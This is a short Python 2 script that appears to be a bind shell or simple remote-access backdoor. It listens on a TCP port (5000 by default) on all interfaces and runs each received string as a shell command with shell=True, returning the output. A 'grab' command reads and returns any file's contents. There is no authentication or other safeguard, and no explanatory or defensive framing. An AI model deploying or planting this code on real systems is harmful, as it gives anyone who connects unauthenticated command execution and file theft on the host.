import socket
import os
import sys
import subprocess

HOST = ''

'''
Command line arguments.
Default to port 5000
'''
if '-p' in sys.argv:
    try:
        PORT = int(sys.argv[sys.argv.index('-p') + 1])
    except:
        print "Invalid port input"
        PORT = 5000
else:
    PORT = 5000


def grab(file_name):
    try:
        return open(file_name, "rb").read()
    except:
        return ''
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)
conn, addr = s.accept()

while 1:
    data = conn.recv(1024)
    if not data:
        break
    if data == "exit":
        conn.sendall(data)
        break

    try:
        if data.split()[0] == "grab":
            out = grab(data.split()[1])
        else:
            out = subprocess.check_output(data, stderr=subprocess.STDOUT, shell=True)
            if not out:
                out = "Done."
            if data.split()[0] == "cd":
                os.chdir(data.split()[1])
    except Exception, e:
        out = str(e.output)
    conn.sendall(out)

conn.close()


